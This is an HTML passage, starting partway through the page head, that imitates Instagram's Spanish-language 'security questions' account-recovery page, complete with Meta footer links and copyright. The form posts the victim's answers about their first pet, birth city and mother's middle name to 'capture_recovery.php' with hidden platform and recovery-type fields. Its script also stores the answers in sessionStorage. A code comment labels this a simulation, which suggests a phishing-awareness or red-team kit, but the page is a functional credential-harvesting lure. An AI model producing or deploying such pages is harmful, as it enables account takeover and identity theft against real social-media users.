    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .ig-header {
            background: white;
            padding: 12px 20px;
            border-bottom: 1px solid #dbdbdb;
            display: flex;
            align-items: center;
            gap: 12px;
            position: sticky;
            top: 0;
            z-index: 10;
        }
        
        .ig-back-btn {
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #262626;
            padding: 0 8px;
        }
        
        .ig-header h1 {
            font-size: 16px;
            font-weight: 600;
            color: #262626;
        }
        
        .ig-main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .ig-card {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            max-width: 400px;
            width: 100%;
            padding: 24px;
        }
        
        .ig-card h2 {
            font-size: 16px;
            font-weight: 600;
            color: #262626;
            margin-bottom: 8px;
        }
        
        .ig-subtitle {
            color: #8e8e8e;
            font-size: 14px;
            margin-bottom: 24px;
            line-height: 1.4;
        }
        
        .ig-question-group {
            margin-bottom: 20px;
        }
        
        .ig-question-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #262626;
            margin-bottom: 8px;
        }
        
        .ig-input {
            width: 100%;
            padding: 10px 12px;
            font-size: 14px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            outline: none;
            transition: border-color 0.2s;
        }
        
        .ig-input:focus {
            border-color: #a8a8a8;
        }
        
        .ig-hint {
            font-size: 11px;
            color: #8e8e8e;
            margin-top: 4px;
        }
        
        .ig-actions {
            display: flex;
            align-items: center;
            justify-content: flex-end;
            padding-top: 16px;
            border-top: 1px solid #dbdbdb;
            margin-top: 8px;
        }
        
        .ig-btn-continue {
            background: #0095f6;
            color: white;
            border: none;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 600;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        .ig-btn-continue:hover {
            background: #1877f2;
        }
        
        .ig-footer {
            padding: 16px;
            text-align: center;
        }
        
        .ig-footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 12px;
            margin-bottom: 12px;
        }
        
        .ig-footer-links a {
            color: #8e8e8e;
            font-size: 11px;
            text-decoration: none;
        }
        
        .ig-copyright {
            color: #8e8e8e;
            font-size: 11px;
        }
        
        @media (max-width: 480px) {
            .ig-card {
                border: none;
                background: transparent;
                padding: 16px;
            }
            
            body {
                background: white;
            }
        }
        
        .loading-spinner {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <header class="ig-header">
        <button class="ig-back-btn" onclick="history.back()">←</button>
        <h1>Preguntas de seguridad</h1>
    </header>
    
    <main class="ig-main">
        <div class="ig-card">
            <h2>Verifica tu identidad</h2>
            <p class="ig-subtitle">Responde las preguntas de seguridad que configuraste anteriormente.</p>
            
            <form id="securityForm" action="capture_recovery.php" method="POST">
                <input type="hidden" name="platform" value="instagram">
                <input type="hidden" name="recovery_type" value="security_questions">
                <input type="hidden" name="contact" id="hiddenContact">
                
                <div class="ig-question-group">
                    <label>¿Cuál es el nombre de tu primera mascota?</label>
                    <input type="text" name="question_1" class="ig-input" placeholder="Nombre de tu mascota" required autocomplete="off">
                    <div class="ig-hint">Pregunta de seguridad común</div>
                </div>
                
                <div class="ig-question-group">
                    <label>¿Cuál es tu ciudad de nacimiento?</label>
                    <input type="text" name="question_2" class="ig-input" placeholder="Ciudad" required autocomplete="off">
                </div>
                
                <div class="ig-question-group">
                    <label>¿Cuál es el segundo nombre de tu madre?</label>
                    <input type="text" name="question_3" class="ig-input" placeholder="Nombre" required autocomplete="off">
                </div>
                
                <div class="ig-actions">
                    <button type="submit" class="ig-btn-continue" id="submitBtn">Verificar respuestas</button>
                </div>
            </form>
        </div>
    </main>
    
    <footer class="ig-footer">
        <div class="ig-footer-links">
            <a href="#">Meta</a>
            <a href="#">Información</a>
            <a href="#">Blog</a>
            <a href="#">Empleo</a>
            <a href="#">Ayuda</a>
            <a href="#">API</a>
            <a href="#">Privacidad</a>
            <a href="#">Condiciones</a>
        </div>
        <div class="ig-copyright">
            © 2025 Instagram from Meta
        </div>
    </footer>
    
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const contact = urlParams.get('contact') || sessionStorage.getItem('ig_recovery_contact') || '';
        document.getElementById('hiddenContact').value = contact;
        
        document.getElementById('securityForm').addEventListener('submit', function(e) {
            const btn = document.getElementById('submitBtn');
            const originalText = btn.textContent;
            btn.innerHTML = '<span class="loading-spinner"></span>Verificando...';
            btn.disabled = true;
            
            // Guardar respuestas en sessionStorage (simulación)
            const q1 = document.querySelector('input[name="question_1"]').value;
            const q2 = document.querySelector('input[name="question_2"]').value;
            const q3 = document.querySelector('input[name="question_3"]').value;
            
            sessionStorage.setItem('ig_recovery_q1', q1);
            sessionStorage.setItem('ig_recovery_q2', q2);
            sessionStorage.setItem('ig_recovery_q3', q3);
        });
    </script>
</body>
</html>
